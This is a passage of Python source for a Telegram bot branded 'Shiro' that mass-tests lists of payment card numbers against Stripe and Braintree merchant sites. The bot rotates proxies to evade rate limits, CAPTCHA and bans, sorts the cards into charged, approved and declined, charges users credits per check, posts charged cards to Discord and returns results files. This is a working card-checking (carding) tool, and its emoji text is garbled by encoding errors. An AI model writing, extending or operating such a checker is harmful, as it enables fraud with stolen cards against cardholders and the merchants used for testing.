    file_lines.append(f"  Total: {done}  |  Time: {f_time}")
    file_lines.append(f"  Ã°Å¸â€Â¥ Charged: {charged}  Ã¢Å“â€¦ Approved: {approved}")
    file_lines.append(f"  Ã¢ÂÅ’ Declined: {declined}  Ã¢Å¡Â Ã¯Â¸Â Errors: {errors}")
    file_lines.append(f"  Ã°Å¸Å½Â¯ Hit Rate: {hit_rate:.1f}%")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
    file_lines.append("")
    if charged_cards:
        file_lines.append("           Ã°Å¸â€Â¥  CHARGED")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in charged_cards:
            file_lines.append(f"  {c}")
        file_lines.append("")
    if approved_cards:
        file_lines.append("           Ã¢Å“â€¦  APPROVED")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in approved_cards:
            file_lines.append(f"  {c}")
        file_lines.append("")
    if declined_cards:
        file_lines.append("           Ã¢ÂÅ’  DECLINED")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in declined_cards:
            file_lines.append(f"  {c}")
        file_lines.append("")
    if error_cards:
        file_lines.append("           Ã¢Å¡Â Ã¯Â¸Â  ERRORS")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        for c in error_cards:
            file_lines.append(f"  {c}")
        file_lines.append("")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
    file_lines.append("        Powered by Shiro Ã¢Å¡Â¡")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")

    file_content = "\n".join(file_lines)
    f_buf = io.BytesIO(file_content.encode("utf-8"))
    f_buf.name = f"stripe_mass_{done}cards.txt"

    _cap  = f"Ã¢Å¡Â¡ <b>{sc('STRIPE CHARGE RESULTS')}</b>\n"
    _cap += f"Ã°Å¸â€™Å½ <b>{charged}</b>  Ã¢Å“â€¦ <b>{approved}</b>  Ã¢ÂÅ’ {declined}  Ã¢Å¡Â Ã¯Â¸Â {errors}  Ã‚Â·  Ã°Å¸Å½Â¯ {hit_rate:.1f}%  Ã‚Â·  Ã¢ÂÂ± {f_time}"
    try:
        bot.send_document(cid, f_buf, caption=_cap, parse_mode="HTML")
    except Exception:
        try:
            bot.send_message(cid, _cap, parse_mode="HTML")
        except Exception:
            pass


@bot.message_handler(func=lambda m: True, content_types=["text", "document"])
@_crash_safe
def handle_cards_or_sets(message):
    cid = message.chat.id
    _clean_pending()  # expire stale entries
    # Log what type of pending input we're receiving
    if cid in pending_sites:
        _log_cmd(message, "[sites input]")
    elif cid in pending_proxies:
        _log_cmd(message, "[proxies input]")
    elif cid in pending_msh:
        _log_cmd(message, "[mass cards input]", extra=f"{len((message.text or '').splitlines())} lines")
    elif cid in pending_mbt:
        _log_cmd(message, "[mass bt cards input]", extra=f"{len((message.text or '').splitlines())} lines")
    elif cid in pending_mst:
        _log_cmd(message, "[mass st cards input]", extra=f"{len((message.text or '').splitlines())} lines")
    elif cid in pending_bt_sites:
        _log_cmd(message, "[bt sites input]")
    elif cid in pending_ac_link:
        _log_cmd(message, "[ac link input]")
    elif cid in pending_ac_cards:
        _log_cmd(message, "[ac cards input]", extra=f"{len((message.text or '').splitlines())} lines")
    if message.text and cid in pending_sites:
        del pending_sites[cid]
        raw = [x.strip() for x in (message.text or "").split("\n") if x.strip()]
        if not raw:
            bot.reply_to(message, "No valid site URLs.")
            return
        status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing sites with test card...")
        working, dead = _test_and_save_sites(cid, raw, status_msg)
        out = f"Ã¢Å“â€¦ Saved <b>{len(working)}</b> working site(s)."
        if dead:
            out += f"\nÃ¢ÂÅ’ {len(dead)} dead: " + ", ".join([s.replace("https://", "").replace("http://", "").split("/")[0] for s in dead[:5]])
            if len(dead) > 5:
                out += f" +{len(dead)-5} more"
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
        return
    if message.text and cid in pending_proxies:
        del pending_proxies[cid]
        lines = [x.strip() for x in (message.text or "").replace(",", "\n").split("\n") if x.strip()]
        if not lines:
            bot.reply_to(message, "No valid proxies.")
            return
        status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing proxies...")
        working_urls, failed = _test_and_save_proxies(cid, lines, status_msg)
        sc = _to_bold_sans
        proxy_lines = [f"  <code>{_proxy_display_name(p)}</code>" for p in working_urls[:15]]
        if len(working_urls) > 15:
            proxy_lines.append(f"  ... +{len(working_urls) - 15} more")
        out  = f"<b>{sc('PROXY SETUP')}</b> Ã°Å¸â€â€”\n"
        out += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
        out += f"Ã¢â€“Â¸ <b>{sc('STATUS:')}</b> Ã¢Å“â€¦ {sc('SAVED')}\n"
        out += f"Ã¢â€“Â¸ <b>{sc('WORKING:')}</b> {len(working_urls)}\n"
        if failed:
            out += f"Ã¢â€“Â¸ <b>{sc('FAILED:')}</b> {failed}\n"
        out += f"\n<b>{sc('PROXIES:')}</b>\n" + "\n".join(proxy_lines)
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
        _discord_proxies_set(message, working_urls)
        return
    # Ã¢â€â‚¬Ã¢â€â‚¬ Braintree site input Ã¢â€â‚¬Ã¢â€â‚¬
    if message.text and cid in pending_bt_sites:
        del pending_bt_sites[cid]
        raw = [x.strip() for x in (message.text or "").split("\n") if x.strip()]
        if not raw:
            bot.reply_to(message, "No valid site URLs.")
            return
        status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing BT sites...")
        working, dead = _test_and_save_bt_sites(cid, raw, status_msg)
        out = f"Ã¢Å“â€¦ Saved <b>{len(working)}</b> working Braintree site(s)."
        if dead:
            out += f"\nÃ¢ÂÅ’ {len(dead)} failed: " + ", ".join([s.replace("https://", "").replace("http://", "").split("/")[0] for s in dead[:5]])
            if len(dead) > 5:
                out += f" +{len(dead)-5} more"
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
        return
    # Ã¢â€â‚¬Ã¢â€â‚¬ Auto-Checkout: waiting for Stripe Checkout link Ã¢â€â‚¬Ã¢â€â‚¬
    if message.text and cid in pending_ac_link:
        _handle_ac_link(message)
        return
    # Ã¢â€â‚¬Ã¢â€â‚¬ Auto-Checkout: waiting for cards Ã¢â€â‚¬Ã¢â€â‚¬
    if message.text and cid in pending_ac_cards:
        _handle_ac_cards(message)
        return
    cards = []
    _is_bt_mass = False
    _is_st_mass = False
    if message.document:
        if cid in pending_msh or cid in pending_mbt or cid in pending_mst or (message.caption and ("/msh" in (message.caption or "").lower() or "/mbt" in (message.caption or "").lower() or "/mst" in (message.caption or "").lower())):
            if cid in pending_mbt:
                _is_bt_mass = True
                del pending_mbt[cid]
            elif cid in pending_mst:
                _is_st_mass = True
                del pending_mst[cid]
            elif cid in pending_msh:
                del pending_msh[cid]
            file_id = message.document.file_id
            f = bot.get_file(file_id)
            data = bot.download_file(f.file_path)
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            cards = [x.strip() for x in text.split("\n") if x.strip() and "|" in x]
        else:
            return
    elif message.text and cid in pending_mbt:
        _is_bt_mass = True
        del pending_mbt[cid]
        text = (message.text or "").strip()
        lines = text.split("\n")
        if len(lines) == 1 and lines[0].count("|") == 3:
            cards = [lines[0]]
        else:
            cards = [x.strip() for x in lines if x.strip() and x.count("|") == 3]
    elif message.text and cid in pending_msh:
        del pending_msh[cid]
        text = (message.text or "").strip()
        lines = text.split("\n")
        if len(lines) == 1 and lines[0].count("|") == 3:
            cards = [lines[0]]
        else:
            cards = [x.strip() for x in lines if x.strip() and x.count("|") == 3]
    elif message.text and cid in pending_mst:
        _is_st_mass = True
        del pending_mst[cid]
        text = (message.text or "").strip()
        lines = text.split("\n")
        if len(lines) == 1 and lines[0].count("|") == 3:
            cards = [lines[0]]
        else:
            cards = [x.strip() for x in lines if x.strip() and x.count("|") == 3]
    if not cards:
        return
    # Luhn pre-validation: filter out invalid cards before deducting credits
    _invalid_count = 0
    _valid_cards = []
    for _c in cards:
        _c_clean = _c.replace(" ", "").replace("/", "|").replace(":", "|")
        _v, _e = _validate_card_format(_c_clean)
        if _v:
            _valid_cards.append(_c_clean)
        else:
            _invalid_count += 1
    if _invalid_count > 0 and not _valid_cards:
        bot.reply_to(message, f"Ã¢ÂÅ’ All {_invalid_count} card(s) failed validation (Luhn/format/expiry). No credits deducted.")
        return
    if _invalid_count > 0:
        bot.reply_to(message, f"Ã¢Å¡Â Ã¯Â¸Â Skipped {_invalid_count} invalid card(s) (Luhn/format/expiry). Checking {len(_valid_cards)} valid card(s).")
    cards = _valid_cards
    uid = getattr(message.from_user, "id", None)
    _udata = _get_cached_user_data(uid) if uid else None
    if not uid or _udata is None:
        bot.reply_to(message, "Register first to use the bot.", parse_mode="HTML")
        return
    _is_owner = (uid in OWNER_IDS)
    _has_plan = _user_has_active_plan(uid)
    if not _is_owner and not _has_plan:
        cards = cards[:MASS_MAX_CARDS]
    need_credits = len(cards)
    if not _is_owner and not _has_plan:
        cred = _udata.get("credits", 0)
        if cred is None or cred < need_credits:
            bot.reply_to(message, f"Insufficient credits. You need {need_credits} credit(s) for {len(cards)} card(s).", parse_mode="HTML")
            return
        if not deduct_credits(uid, need_credits):
            bot.reply_to(message, "Insufficient credits.")
            return
    if _is_st_mass:
        # Stripe Charge needs proxies for Stripe API to avoid rate limits
        proxies = get_proxies(cid)
        if uid and cid != uid and not proxies:
            proxies = get_proxies(uid)
        if not proxies:
            bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â <b>Proxies required.</b> Add proxies first using <code>/setproxies</code> to avoid rate limits.", parse_mode="HTML")
            # Refund credits
            if not _is_owner and not _has_plan:
                coll = _users_coll()
                if coll is not None:
                    coll.update_one({"_id": uid}, {"$inc": {"credits": need_credits}})
                    _invalidate_user_cache(uid)
            return
        status_msg = bot.reply_to(message, f"Ã¢Å¡Â¡ Starting Stripe Charge mass check: {len(cards)} cards", parse_mode="HTML")
        def _run_st_mass():
            try:
                _run_st_mass_inner(message, cid, uid, cards, proxies, _is_owner)
            except Exception as e:
                log.error('StMass', f'Mass check crashed: {e}')
                try:
                    bot.send_message(cid, f"Ã¢ÂÅ’ Mass check error: {str(e)[:200]}")
                except Exception:
                    pass
        _mass_pool.submit(_run_st_mass)
        return

    sites = get_bt_sites(cid) if _is_bt_mass else get_sites(cid)
    proxies = get_proxies(cid)
    # Fallback: if group chat has no sites/proxies, try user's DM settings
    if uid and cid != uid:
        if not sites:
            sites = get_bt_sites(uid) if _is_bt_mass else get_sites(uid)
        if not proxies:
            proxies = get_proxies(uid)
    if not sites:
        if _is_bt_mass:
            bot.reply_to(message, "No BT sites. <code>/btsite</code> to add.", parse_mode="HTML")
        else:
            bot.reply_to(message, "No sites. <code>/setsite</code> to add.", parse_mode="HTML")
        return
    if not proxies:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â <b>Proxies required.</b> Add proxies first using <code>/setproxies</code> to avoid CAPTCHA and bans.", parse_mode="HTML")
        return

    if _is_bt_mass:
        _mass_pool.submit(_run_bt_mass_check_body, message, cid, uid, cards, sites, proxies, _is_owner)
    else:
        # Ã¢â€â‚¬Ã¢â€â‚¬ Launch mass check in a background thread to free handler thread Ã¢â€â‚¬Ã¢â€â‚¬
        # This prevents /msh from blocking the Telegram handler pool (num_threads=16).
        # Other commands (/stop, /start, menu) stay responsive even during 5+ concurrent mass checks.
        _mass_pool.submit(_run_mass_check_body, message, cid, uid, cards, sites, proxies, _is_owner)


# Ã¢â€â‚¬Ã¢â€â‚¬ Dedicated mass check executor pool (separate from 5-thread _bg_pool) Ã¢â€â‚¬Ã¢â€â‚¬
_mass_pool = ThreadPoolExecutor(max_workers=10, thread_name_prefix="mass")


def _run_bt_mass_check_body(message, cid, uid, cards, bt_sites, proxies, _is_owner):
    """Run BT mass check in background thread."""
    try:
        _run_bt_mass_check_inner(message, cid, uid, cards, bt_sites, proxies, _is_owner)
    except Exception as e:
        if DEBUG:
            traceback.print_exc()
        try:
            bot.send_message(cid, f"Ã¢Å¡Â Ã¯Â¸Â BT mass check error: {str(e)[:200]}", parse_mode="HTML")
        except Exception:
            pass


def _run_bt_mass_check_inner(message, cid, uid, cards, bt_sites, proxies, _is_owner):
    total = len(cards)
    charged = 0
    approved = 0
    declined = 0
    errors = 0
    checked = 0
    _stop_flags.pop(cid, None)
    charged_cards = []
    approved_cards = []
    declined_cards = []  # Store declined cards with messages
    error_cards = []     # Store error cards with messages
    _hit_count = [0]
    _check_start_time = time.time()
    sc = _to_bold_sans

    def _bt_status_kb(final=False):
        kb = types.InlineKeyboardMarkup(row_width=4)
        kb.row(
            types.InlineKeyboardButton(f"Ã°Å¸â€™Å½ Charged Ã‚Â· {charged}", callback_data="msh_noop"),
            types.InlineKeyboardButton(f"Ã¢Å“â€¦ Approved Ã‚Â· {approved}", callback_data="msh_noop"),
        )
        kb.row(
            types.InlineKeyboardButton(f"Ã¢ÂÅ’ Declined Ã‚Â· {declined}", callback_data="msh_noop"),
            types.InlineKeyboardButton(f"Ã¢Å¡Â Ã¯Â¸Â Errors Ã‚Â· {errors}", callback_data="msh_noop"),
        )
        if not final:
            kb.row(types.InlineKeyboardButton("Ã°Å¸â€ºâ€˜ Stop Check", callback_data=f"msh_stop_{cid}"))
        return kb

    def _bt_status_text(final=False):
        elapsed = time.time() - _check_start_time
        mins, secs = divmod(int(elapsed), 60)
        time_str = f"{mins}:{secs:02d}" if mins else f"0:{secs:02d}"
        pct = (100.0 * checked / total) if total else 0.0
        bar_len = 20
        filled = int(bar_len * checked / total) if total else 0
        bar = "Ã¢â€“Ë†" * filled + "Ã¢â€“â€˜" * (bar_len - filled)
        speed = checked / elapsed if elapsed > 0 else 0.0
        speed_str = f"{speed:.2f}" if speed < 1 else f"{speed:.1f}"
        _spin = "Ã¢â€”ÂÃ¢â€”â€œÃ¢â€”â€˜Ã¢â€”â€™"
        spin = _spin[checked % len(_spin)] if not final else "Ã¢Å“â€¦"

        txt  = f"Ã°Å¸â€Â· <b>{sc('BRAINTREE MASS CHECK')}</b>\n\n"
        if final:
            hits = charged + approved
            hit_rate = (hits / checked * 100) if checked > 0 else 0.0
            txt += f"Ã¢Å“â€¦ <b>{sc('COMPLETED')}</b>\n"
            txt += f"<code>Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°</code> <b>100%</b>\n\n"
            txt += f"Ã°Å¸â€œÅ  <b>STATISTICS</b>\n"
            txt += f"Cards    Ã‚Â· <code>{checked}/{total}</code>\n"
            txt += f"Time     Ã‚Â· <code>{time_str}</code>\n"
            txt += f"Speed    Ã‚Â· <code>{speed_str} c/s</code>\n"
            txt += f"Hit Rate Ã‚Â· <b>{hit_rate:.1f}%</b>\n\n"
            txt += f"Ã¢Å¡â„¢Ã¯Â¸Â {sc('BRAINTREE [MASS]')}  Ã‚Â·  {sc('SHIRO')} Ã¢Å¡Â¡"
        else:
            txt += f"{spin} <b>{sc('PROCESSING')}</b>\n"
            txt += f"<code>{bar}</code> <b>{pct:.0f}%</b>\n\n"
            txt += f"Ã°Å¸â€œÅ  <b>PROGRESS</b>\n"
            txt += f"Cards Ã‚Â· <code>{checked}/{total}</code>\n"
            txt += f"Time  Ã‚Â· <code>{time_str}</code>\n"
            if speed > 0:
                remaining = (total - checked) / speed
                r_mins, r_secs = divmod(int(remaining), 60)
                eta = f"{r_mins}:{r_secs:02d}" if r_mins else f"0:{r_secs:02d}"
                txt += f"Speed Ã‚Â· <code>{speed_str} c/s</code>\n"
                txt += f"ETA   Ã‚Â· <code>{eta}</code>\n"
            else:
                txt += f"Status Ã‚Â· {sc('STARTING...')}\n"
            txt += f"\nÃ°Å¸â€™Å½ <b>{charged}</b>  Ã¢Å“â€¦ <b>{approved}</b>  Ã¢ÂÅ’ <b>{declined}</b>  Ã¢Å¡Â Ã¯Â¸Â <b>{errors}</b>\n\n"
            txt += f"Ã¢Å¡â„¢Ã¯Â¸Â {sc('BRAINTREE [MASS]')}"
        return txt

    status_msg = bot.reply_to(message, _bt_status_text(), parse_mode="HTML", reply_markup=_bt_status_kb())
    last_edit = [0.0]
    _edit_lock = threading.Lock()

    def _update_bt_status(force=False):
        now = time.time()
        if not force and now - last_edit[0] < 2.0:
            return
        if not _edit_lock.acquire(blocking=False):
            return
        try:
            bot.edit_message_text(_bt_status_text(), cid, status_msg.message_id, parse_mode="HTML", reply_markup=_bt_status_kb())
            last_edit[0] = time.time()
        except Exception:
            pass
        finally:
            _edit_lock.release()

    for idx, card in enumerate(cards):
        # Check global stop flag
        global _mass_check_stop_flag
        if _mass_check_stop_flag or _stop_flags.get(cid):
            _stop_flags.pop(cid, None)
            refund = total - checked
            if refund > 0 and not _is_owner:
                coll = _users_coll()
                if coll is not None:
                    coll.update_one({"_id": uid}, {"$inc": {"credits": refund}})
                    _invalidate_user_cache(uid)
            break

        card = card.strip()
        parts = card.replace(" ", "").replace("/", "|").replace(":", "|").split("|")
        if len(parts) != 4:
            errors += 1
            checked += 1
            _update_bt_status()
            continue

        site = _pick_site_rr(bt_sites)
        proxy = _pick_proxy(proxies)  # Rotate proxy for each check
        card_str = "|".join(parts)

        try:
            result = _run_bt_sync(site, card_str, proxy)
            _record_proxy_result(proxy, result)
            _record_site_result(site, result)  # NEW: Track site health
        except Exception:
            result = {"status": "Error", "message": "Exception", "error_code": "EXCEPTION"}

        _bg_fire(_log_check_result, uid, card_str.split("|")[0][-4:], "Braintree", result.get("status", "Error"), result.get("error_code") or result.get("message", ""), site)
        st = result.get("status", "Error")
        msg = result.get("message", "Unknown")
        if st == "Charged":
            charged += 1
            _hit_count[0] += 1
            charged_cards.append(card_str)
            try:
                site_short = site.replace("https://", "").replace("http://", "").split("/")[0]
                _discord_charged(message, card_str, site_short, "", "", "mass_bt", status="Charged", response="BT CHARGED")
            except Exception:
                pass
        elif st == "Approved":
            approved += 1
            _hit_count[0] += 1
            approved_cards.append(card_str)
        elif st == "Declined":
            declined += 1
            declined_cards.append(f"{card_str} | {msg}")
        else:
            errors += 1
            error_cards.append(f"{card_str} | {msg}")
            if not _is_owner:
                coll = _users_coll()
                if coll is not None:
                    coll.update_one({"_id": uid}, {"$inc": {"credits": 1}})
                    _invalidate_user_cache(uid)

        checked += 1
        _update_bt_status()

    # Final update
    try:
        bot.edit_message_text(_bt_status_text(final=True), cid, status_msg.message_id, parse_mode="HTML", reply_markup=_bt_status_kb(final=True))
    except Exception:
        pass

    if _hit_count[0] > 0:
        increment_total_hits(uid, _hit_count[0])
    increment_total_checks(uid, checked)

    # Send results text file
    try:
        elapsed_final = time.time() - _check_start_time
        f_mins, f_secs = divmod(int(elapsed_final), 60)
        f_time = f"{f_mins}m {f_secs:02d}s" if f_mins else f"{f_secs}s"
        f_speed = checked / elapsed_final if elapsed_final > 0 else 0
        f_speed_str = f"{f_speed:.2f}" if f_speed < 1 else f"{f_speed:.1f}"
        f_hits = charged + approved
        f_hit_rate = (f_hits / checked * 100) if checked > 0 else 0

        file_lines = []
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("     Ã°Å¸â€Â·  BRAINTREE MASS CHECK  Ã°Å¸â€Â·")
        file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
        file_lines.append("")
        file_lines.append("  Ã°Å¸â€œÅ   STATISTICS")
        file_lines.append(f"  Ã¢â€Å“ Total      Ã‚Â·  {checked}/{total}")
        file_lines.append(f"  Ã¢â€Å“ Time       Ã‚Â·  {f_time}")
        file_lines.append(f"  Ã¢â€Å“ Speed      Ã‚Â·  {f_speed_str} c/s")
        file_lines.append(f"  Ã¢â€â€ Hit Rate   Ã‚Â·  {f_hit_rate:.1f}%")
        file_lines.append("")
        file_lines.append("  Ã°Å¸â€œâ€¹  RESULTS")
        file_lines.append(f"  Ã¢â€Å“ Ã°Å¸â€™Å½ Charged    Ã‚Â·  {charged}")
        file_lines.append(f"  Ã¢â€Å“ Ã¢Å“â€¦ Approved   Ã‚Â·  {approved}")
        file_lines.append(f"  Ã¢â€Å“ Ã¢ÂÅ’ Declined   Ã‚Â·  {declined}")
        file_lines.append(f"  Ã¢â€â€ Ã¢Å¡Â Ã¯Â¸Â Errors     Ã‚Â·  {errors}")
        if errors > 0 and not _is_owner:
            file_lines.append(f"\n  Ã°Å¸â€™Â° Refunded    Ã‚Â·  {errors} credit(s)")
        file_lines.append("")
        
        if charged_cards:
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            file_lines.append("           Ã°Å¸â€™Å½  CHARGED")
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            for c in charged_cards:
                file_lines.append(f"  {c}")
            file_lines.append("")
        
        if approved_cards:
            file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
            file_lines.append("           Ã¢Å“â€¦  APPROVED")
